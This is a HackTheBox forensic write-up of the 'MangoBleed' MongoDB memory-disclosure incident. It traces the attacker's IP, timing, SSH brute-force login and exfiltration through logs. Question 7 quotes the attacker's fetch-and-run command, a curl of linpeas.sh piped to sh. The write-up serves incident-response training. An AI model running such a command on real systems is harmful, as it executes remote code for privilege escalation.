# MangoBleed — HackTheBox Writeup

---

## Question 1. What is the CVE ID designated to the MongoDB vulnerability explained in the scenario?

I read about the scenario and learned that the incident is related to a MongoDB heap memory disclosure vulnerability called MongoBleed, so the answer is `CVE-2025-14847`.

<img width="1066" height="605" alt="Image" src="https://github.com/user-attachments/assets/ac302b41-1a5c-4135-a069-c40c4e844ad4" />

---

## Question 2. What is the version of MongoDB installed on the server that the CVE exploited?

I analyzed the MongoDB log file located at `/var/log/mongodb` and found that the version of MongoDB is `8.0.16`.

<img width="1917" height="540" alt="Image" src="https://github.com/user-attachments/assets/fe6d10d5-0f96-4a90-8788-8af3008a9a3e" />

---

## Question 3. Analyze the MongoDB logs to identify the attacker's remote IP address used to exploit the CVE.

I searched using the keyword `Connection` and found many connection attempts from the IP address `65.0.76.43` across many different ports.

<img width="1895" height="941" alt="Image" src="https://github.com/user-attachments/assets/b30b48d5-7161-493f-956c-67794bdbb80e" />

---

## Question 4. Based on the MongoDB logs, determine the exact date and time the attacker's exploitation activity began (the earliest confirmed malicious event).

I identified the earliest time the attacker began connecting to the MongoDB server, which was `2025-12-29 05:25:52`.

<img width="1892" height="937" alt="Image" src="https://github.com/user-attachments/assets/90b2f029-7fe5-4911-909d-ca0daaed130f" />

---

## Question 5. Using the MongoDB logs, calculate the total number of malicious connections initiated by the attacker.

The question asks for the total number of malicious connections initiated by the attacker. This includes both accepted connections and ended connections, so the answer is `75260`.

<img width="1396" height="186" alt="Image" src="https://github.com/user-attachments/assets/efa9f1af-6599-4ad3-9a2e-05718563b842" />

---

## Question 6. The attacker gained remote access after a series of brute‑force attempts. The attack likely exposed sensitive information, which enabled them to gain remote access. Based on the logs, when did the attacker successfully gain interactive hands-on remote access?

I started by filtering `auth.log` with the identified malicious IP address. I can see the account `mongoadmin` is being targeted.

<img width="1917" height="995" alt="Image" src="https://github.com/user-attachments/assets/5dc5c659-d5a0-49d2-9a3d-d460451f22f2" />

I noticed that there are many failed attempts, and between these, there is a successful session start for the `mongoadmin` account.

<img width="1917" height="447" alt="Image" src="https://github.com/user-attachments/assets/ee0b8625-f8d4-42c0-8b06-6cde7ccd306d" />

I noticed this session was very short, so it was probably just a check from the brute-force tool.

<img width="1912" height="267" alt="Image" src="https://github.com/user-attachments/assets/15706cee-adc5-45b7-8847-9a3657a190f3" />

Looking further, I found a successful login session from the `mongoadmin` account that lasted about 8 minutes, which strongly suggests the attacker logged in successfully. The time was `2025-12-29 05:40:03`.

<img width="1917" height="137" alt="Image" src="https://github.com/user-attachments/assets/be960873-6e0c-4453-abc2-8f3d4a85e50c" />

---

## Question 7. Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

I searched the command history file at `MangoBleed\uac-mongodbsync-linux-triage\[root]\home\mongoadmin\.bash_history` and found `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`. This command downloads and runs linpeas.sh, which is a tool that scans the system for possible privilege escalation paths.

<img width="1912" height="267" alt="Image" src="https://github.com/user-attachments/assets/15706cee-adc5-45b7-8847-9a3657a190f3" />

---

## Question 8. The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

I noticed the attacker downloaded a zip tool, possibly to unzip a malicious file. The attacker then moved into the `/var/lib/mongodb` directory and started a Python web server, which shows that data exfiltration was likely happening.

<img width="1102" height="481" alt="Image" src="https://github.com/user-attachments/assets/8d138815-a76b-4394-8b67-011165ce415d" />